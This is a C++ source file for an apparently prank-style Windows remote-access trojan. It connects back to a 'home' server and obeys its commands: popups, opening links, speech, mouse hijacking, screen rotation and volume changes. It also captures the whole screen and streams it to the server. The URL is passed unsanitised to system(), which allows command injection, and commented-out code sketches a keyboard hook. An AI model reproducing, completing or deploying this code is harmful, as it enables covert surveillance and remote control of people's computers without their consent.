#include <asio.hpp>
#include <string>
#include <thread>
#include <map>
#include "ip.h"
#include <iostream>
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <stdlib.h>
#include <sapi.h>
#include <random>
#include <winnt.h>
#define STB_IMAGE_IMPLEMENTATION
#include "stb_image.h"
#include "../../packet.h"
// #include "stupid_windows.h"
using asio::ip::tcp;

// Create terms of service

int random_in_range(int min, int max) {
static std::random_device rd;  // Seed
    static std::mt19937 gen(rd()); // Mersenne Twister RNG
    std::uniform_int_distribution<> distrib(min, max);
    return distrib(gen);
}

void show_popup(const char* message) {
    MessageBoxA(NULL, message, "Popup", MB_OK | MB_ICONINFORMATION);
}

void lockMouseToBox(int x, int y, int width, int height) {
    RECT rect;
    rect.left = x;
    rect.top = y;
    rect.right = x + width;
    rect.bottom = y + height;

    ClipCursor(&rect);
}

void free_locked_mouse() {
    ClipCursor(nullptr);
}

class Packet_Manager {
    private:
    public:
        static int packetid;
        static std::map<int, Packet_Manager*> Every_Package;
        Packet_Manager() {
            Every_Package[packetid++] = this;
        }
        virtual void receive(const Packet& packet) {//std::cout << "This packet cannot receive\n";
        }
        virtual void send(tcp::socket &socket, Packet& packet) {//std::cout << "This packet cannot send\n";
        }
};
int Packet_Manager::packetid = 0;
std::map<int, Packet_Manager*> Packet_Manager::Every_Package;
class Get_data : public Packet_Manager {
    void send(tcp::socket &socket, Packet& packet) override {
        if (packet.id == packet_id::GET_DATA) {
            Packet alive_packet{};
            alive_packet.id = packet_id::GET_DATA;
            alive_packet.number = 1;
            asio::write(socket, asio::buffer(&alive_packet, sizeof(alive_packet)));
        }
    }
};
class Popup : public Packet_Manager {
    void receive(const Packet& packet) override {
        show_popup(packet.str);
    }
};
class Open_link : public Packet_Manager {
    void receive(const Packet &packet) override {
        std::string url = std::string(packet.str);
        std::string command = "start " + url;
        system(command.c_str());
    }
};
class tts : public Packet_Manager {
    void receive(const Packet &packet) override {
        ISpVoice* pVoice = nullptr;
         if (FAILED(::CoInitialize(NULL))) {
             std::cerr << "Failed to initialize COM\n";
             return;
         }

         HRESULT hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void**)&pVoice);
         if (SUCCEEDED(hr)) {
             wchar_t wmsg[256];
             MultiByteToWideChar(CP_UTF8, 0, packet.str, -1, wmsg, 256);
             pVoice->Speak(wmsg, 0, NULL);
             pVoice->Release();
         } else {
             std::cerr << "Failed to create SAPI voice\n";
         }

         ::CoUninitialize();                     
    }       
};

class curser_pos : public Packet_Manager {
    void receive(const Packet &packet) override {
        SetCursorPos(packet.x,packet.y);
    }
};

class random_mouse_move : public Packet_Manager {
    public:
    bool state = false;
    std::thread mouse_move_thread;
    void random_move() {
        while(true) {
            if(state) {
                POINT p;
                GetCursorPos(&p);
                int move_range = 20;
                p.x += random_in_range(-move_range, move_range);
                p.y += random_in_range(-move_range, move_range);
                SetCursorPos(p.x,p.y);
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
            } else {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
            }
        }
    }
    random_mouse_move() {
        mouse_move_thread = std::thread([this](){
            random_move();
        });

        mouse_move_thread.detach();
    }

    void receive(const Packet &packet) override {
        state = packet.bo;
    }
};

class invert_mouse: public Packet_Manager {
    public:
    bool state = false;
    std::thread mouse_move_thread;
    void invert() {
        POINT prevPos, currPos;
        GetCursorPos(&prevPos);

        while (true) {
            if (state) {
                GetCursorPos(&currPos);
                int deltaX = currPos.x - prevPos.x;
                int deltaY = currPos.y - prevPos.y;

                // Invert movement
                int newX = currPos.x - 2 * deltaX;
                int newY = currPos.y - 2 * deltaY;

                SetCursorPos(newX, newY);

                prevPos.x = newX;
                prevPos.y = newY;
            } else {
                GetCursorPos(&prevPos); // Reset when inactive
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(1)); // Prevent CPU thrashing
        }
}
    invert_mouse() {
        mouse_move_thread = std::thread([this](){
            invert();
        });

        mouse_move_thread.detach();
    }

    void receive(const Packet &packet) override {
        state = packet.bo;
    }
};
class lock_mouse_to_box : public Packet_Manager {
    void receive(const Packet &packet) override {
        SetCursorPos((packet.x + packet.size_x) / 2,(packet.y + packet.size_y) / 2);
        lockMouseToBox(packet.x,packet.y,packet.size_x,packet.size_y);
    }
};

class free_mouse : public Packet_Manager {
    void receive(const Packet &packet) override {
        free_locked_mouse();
    }
};
bool captureScreenRGBA(unsigned char*& outPixels,
                       int& width,
                       int& height,
                       int& channels /* =4 */)
{
    HDC hScreenDC = GetDC(nullptr);                // whole desktop
    HDC hMemDC    = CreateCompatibleDC(hScreenDC);

    width  = GetSystemMetrics(SM_CXSCREEN);
    height = GetSystemMetrics(SM_CYSCREEN);
    channels = 4;                                  // we force RGBA8

    // Create a 32‑bit DIB section we can directly copy out of.
    BITMAPINFO bmi { };
    bmi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth       = width;
    bmi.bmiHeader.biHeight      = -height;         // negative = top‑down
    bmi.bmiHeader.biPlanes      = 1;
    bmi.bmiHeader.biBitCount    = 32;              // BGRA, 8 bits each
    bmi.bmiHeader.biCompression = BI_RGB;

    void* dibPixels = nullptr;
    HBITMAP hDib    = CreateDIBSection(
        hScreenDC, &bmi, DIB_RGB_COLORS, &dibPixels, nullptr, 0);

    HGDIOBJ oldBmp = SelectObject(hMemDC, hDib);

    // Copy the screen into our DIB.
    BitBlt(hMemDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

    // Allocate final buffer in the same format stb delivers (RGBA).
    size_t byteCount = static_cast<size_t>(width) * height * channels;
    outPixels = static_cast<unsigned char*>(malloc(byteCount));

    // Convert BGRA → RGBA in‑place while copying.
    uint8_t* src = static_cast<uint8_t*>(dibPixels);
    uint8_t* dst = outPixels;
    for (size_t i = 0; i < width * height; ++i)
    {
        dst[0] = src[2];   // R
        dst[1] = src[1];   // G
        dst[2] = src[0];   // B
        dst[3] = src[3];   // A (always 255 from desktop)
        src += 4; dst += 4;
    }

    // Cleanup
    SelectObject(hMemDC, oldBmp);
    DeleteObject(hDib);
    DeleteDC(hMemDC);
    ReleaseDC(nullptr, hScreenDC);

    return true;
}

class get_video_frame : public Packet_Manager {
    void send(tcp::socket &socket, Packet &packet) override {
        try {
            int width, height, channels;
            unsigned char* data;
            captureScreenRGBA(data, width, height, channels);
            size_t size = width * height * 4; // RGBA = 4 channels
        
            int image_size = width * height * 4;

            int width_net = htonl(width);
            int height_net = htonl(height);
            size_t size_net = htonl(size);
            try {
                asio::write(socket, asio::buffer(&width_net, sizeof(width_net)));
                asio::write(socket, asio::buffer(&height_net, sizeof(height_net)));
                asio::write(socket, asio::buffer(&size_net, sizeof(size_net)));
                
                asio::write(socket, asio::buffer(data, image_size));
            } catch(const std::exception e) {
                std::cout << e.what() << "\n";
                std::cout << "failed to send frame\n";
                return;
            }
        } catch (const std::exception& e) {
            std::cerr << "Exception in get_video_frame::send: " << e.what() << '\n';
        }
    }
};

// class keyboard_type : public Packet_Manager
// {
//     void receive(const Packet& packet) override
//     {
//         Sleep(500);
//         type_string(packet.str);
//     }
// };

// class echo_keyboard : public Packet_Manager {
// public:
//     bool state = false;
//     std::thread worker;
//     HHOOK hHook = nullptr;
// 
//     echo_keyboard()
//     {
//         worker = std::thread([this]{ loop(); });
//         worker.detach();
//     }
// 
//     void loop()
//     {
//         hHook = SetWindowsHookExW(WH_KEYBOARD_LL, keyboard_hook, nullptr, 0);
//         if (!hHook) {
//             std::cerr << "Failed to set hook!\n";
//             return;
//         }
// 
//         MSG msg;
//         while (GetMessage(&msg, nullptr, 0, 0) > 0)
//         {
//             TranslateMessage(&msg);
//             DispatchMessage(&msg);
// 
//             if (!state) continue;                 
// 
//             std::u16string glyph;
//             if (msgToUtf16(msg, glyph))          
//                 type_string(glyph);             
//         }
// 
//         UnhookWindowsHookEx(hHook);
//     }
// 
//     void receive(const Packet& p) override { state = p.bo; }
// };

bool RotatePrimaryMonitor(DWORD angleDeg)
{
    DWORD orientation;
    switch (angleDeg)
    {
        case   0: orientation = DMDO_DEFAULT; break;
        case  90: orientation = DMDO_90;     break;
        case 180: orientation = DMDO_180;    break;
        case 270: orientation = DMDO_270;    break;
        default:  return false;
    }

    DISPLAY_DEVICE dd{ sizeof(dd) };
    if (!EnumDisplayDevices(nullptr, 0, &dd, 0))
        return false;

    DEVMODE dm{ };
    dm.dmSize = sizeof(dm);
    if (!EnumDisplaySettingsEx(dd.DeviceName, ENUM_CURRENT_SETTINGS, &dm, 0))
        return false;

    bool nowPortrait  = (orientation == DMDO_90  || orientation == DMDO_270);
    bool wasPortrait  = (dm.dmDisplayOrientation == DMDO_90 ||
                         dm.dmDisplayOrientation == DMDO_270);
    if (nowPortrait != wasPortrait)
        std::swap(dm.dmPelsWidth, dm.dmPelsHeight);

    dm.dmDisplayOrientation = orientation;
    dm.dmFields = DM_DISPLAYORIENTATION | DM_PELSWIDTH | DM_PELSHEIGHT;

    LONG res = ChangeDisplaySettingsEx(dd.DeviceName, &dm, nullptr,
                                       CDS_UPDATEREGISTRY | CDS_GLOBAL, nullptr);
    return (res == DISP_CHANGE_SUCCESSFUL);
}

class rotate_screen : public Packet_Manager {
    void receive(const Packet &packet) override {
        RotatePrimaryMonitor(packet.number);
    }
};

class dead_class : Packet_Manager {}; 
bool SetMasterVolume(float level /*0.0 ‑ 1.0*/)
{
    HRESULT hr;
    CoInitialize(nullptr);                             // 1. COM init

    IMMDeviceEnumerator* pEnum = nullptr;
    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), nullptr,
                          CLSCTX_INPROC_SERVER,
                          IID_PPV_ARGS(&pEnum));
    if (FAILED(hr)) return false;

    IMMDevice* pDevice = nullptr;                      // 2. default render device
    hr = pEnum->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice);
    pEnum->Release();
    if (FAILED(hr)) return false;

    IAudioEndpointVolume* pVolume = nullptr;           // 3. volume interface
    hr = pDevice->Activate(__uuidof(IAudioEndpointVolume),
                           CLSCTX_INPROC_SERVER, nullptr,
                           (void**)&pVolume);
    pDevice->Release();
    if (FAILED(hr)) return false;

    hr = pVolume->SetMasterVolumeLevelScalar(level, nullptr); // 4. set
    pVolume->Release();
    CoUninitialize();
    return SUCCEEDED(hr);
}
class system_volume : Packet_Manager {
    void receive(const Packet &packet) override {
        float real_volume = (float)packet.number / 100;

        SetMasterVolume(real_volume);
    }
};

class kill : Packet_Manager {
    void receive(const Packet &packet) override {
        exit(EXIT_SUCCESS);
    }
};

int main() {

    // Should be defined in the same order as packet_id enum this is badly designed but I do not care this is a stupid project
    Get_data get_data_handle;
    Popup pop_up_handle;
    Open_link open_link_handle;
    tts tts_handle;
    curser_pos curser_pos_handle;
    random_mouse_move random_mouse_handle;
    invert_mouse mouse_invert_handle;
    lock_mouse_to_box lock_mouse_handle;
    free_mouse free_mouse_handle;
    get_video_frame video_frame_handle;
    // keyboard_type keyboard_type_handle;
    // echo_keyboard echo_keyboard_handle;
    dead_class dead1;
    dead_class dead2;
    rotate_screen rotate_screen_handle;
    system_volume system_volume_handle;
    kill kill_handle;

    while(true) {
        std::cout << "trying to connect to home\n";
        try {
            asio::io_context io_context;

            tcp::resolver resolver(io_context);
            auto endpoints = resolver.resolve(ip, "1234");

            tcp::socket socket(io_context);
            asio::connect(socket, endpoints);
            std::cout << "connected to home yayayayayayayayyayay\n";

            while (true) {
                Packet packet;
                std::size_t len = asio::read(socket, asio::buffer(&packet, sizeof(Packet)));

                if (len == sizeof(Packet)) {
                    for(auto [id, handler] : Packet_Manager::Every_Package) {
                        if(packet.id == (packet_id)id) {
                            //std::cout << "processing packet\n";
                            handler->receive(packet);
                            handler->send(socket, packet);
                        }
                    }
                } else {
                    std::cerr << "Error: Incomplete packet received." << std::endl;
                }

            }

        } catch (std::exception& e) {
            std::cout << "failed to connect to home \n";
            std::cerr << "Exception: " << e.what() << "\n";
        }
    }
    return 0;
}
